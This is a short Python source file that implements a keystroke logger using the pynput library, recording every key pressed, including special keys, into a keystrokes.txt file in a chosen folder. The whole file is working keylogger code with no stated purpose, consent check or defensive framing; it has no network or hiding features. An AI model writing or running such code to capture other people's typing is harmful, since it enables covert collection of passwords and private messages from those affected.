from pynput import keyboard
import os

def start_logger(folder_path):
    log_file = os.path.join(folder_path, "keystrokes.txt")
    open(log_file, "a").close()

    def on_press(key):
        try:
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"{key.char}")
        except AttributeError:
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"[{key}]")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()